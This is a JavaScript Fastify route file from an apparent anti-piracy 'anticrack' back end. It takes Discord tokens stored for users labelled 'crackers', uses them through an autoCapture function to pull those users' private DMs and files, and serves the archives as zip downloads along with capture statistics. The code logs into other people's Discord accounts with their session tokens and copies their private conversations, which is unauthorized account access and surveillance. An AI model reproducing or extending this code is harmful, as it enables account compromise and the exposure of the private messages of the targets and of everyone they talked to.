const { getDMArchives, getDMFilesByCracker, getTotalArchives, getTotalArchivedMessages, getTotalArchivedFiles } = require('../lib/anticrack');
const { getCrackerById } = require('../lib/anticrack');
const { autoCapture } = require('../lib/capture');

async function captureRoutes(fastify) {
  fastify.post('/', async (req) => {
    const { crackerId } = req.body || {};
    if (!crackerId) throw { statusCode: 400, message: 'crackerId required' };
    const cracker = await getCrackerById(parseInt(crackerId));
    if (!cracker) throw { statusCode: 404, message: 'Cracker not found' };
    if (!cracker.discord_token) throw { statusCode: 400, message: 'No Discord token for this cracker' };

    const result = await autoCapture(cracker.discord_token, cracker.discord_user || cracker.pc_user, false);
    if (!result.success) throw { statusCode: 500, message: result.reason || 'Capture failed' };

    const archives = await getDMArchives(parseInt(crackerId));
    return { success: true, archives, channels: result.channels, messages: result.messages, files: result.files };
  });

  fastify.get('/archives', async (req) => {
    const { id, archiveId, action } = req.query;
    try {
      if (archiveId) {
        const archives = await getDMArchives(parseInt(id));
        return archives.find(a => a.id === parseInt(archiveId)) || null;
      }
      if (action === 'history') return [];
      return await getDMArchives(parseInt(id));
    } catch (e) {
      console.error('Archives error:', e?.message || e);
      return [];
    }
  });

  fastify.get('/download', async (req, reply) => {
    const id = parseInt(req.query.id);
    if (isNaN(id)) throw { statusCode: 400, message: 'Invalid id' };
    const cracker = await getCrackerById(id);
    const archives = await getDMArchives(id);
    if (archives.length === 0) throw { statusCode: 404, message: 'No archives found' };

    const JSZip = require('jszip');
    const zip = new JSZip();

    for (const archive of archives) {
      const channelFolder = zip.folder(archive.channel_name || `channel_${archive.channel_id}`);
      if (archive.messages && archive.messages.length > 0) {
        const msgText = archive.messages.map(m => {
          const time = new Date(m.timestamp).toISOString();
          const author = m.author?.username || 'Unknown';
          const content = m.content || '';
          let line = `[${time}] ${author}: ${content}`;
          if (m.attachments?.length > 0) {
            line += `\n  Attachments: ${m.attachments.map(a => `${a.filename} (${a.url})`).join(', ')}`;
          }
          return line;
        }).join('\n');
        channelFolder.file('messages.txt', msgText);
        channelFolder.file('messages.json', JSON.stringify(archive.messages, null, 2));
      }
    }

    const username = cracker?.discord_user || cracker?.pc_user || `cracker_${id}`;
    const zipBuffer = await zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' });

    reply.header('Content-Type', 'application/zip');
    reply.header('Content-Disposition', `attachment; filename="${username}_dms.zip"`);
    reply.header('Content-Length', zipBuffer.length);
    return reply.send(zipBuffer);
  });

  fastify.get('/stats', async () => {
    const [archives, messages, files] = await Promise.all([
      getTotalArchives().catch(() => 0),
      getTotalArchivedMessages().catch(() => 0),
      getTotalArchivedFiles().catch(() => 0),
    ]);
    return { total_archives: archives, total_archived_messages: messages, total_archived_files: files };
  });
}

module.exports = captureRoutes;
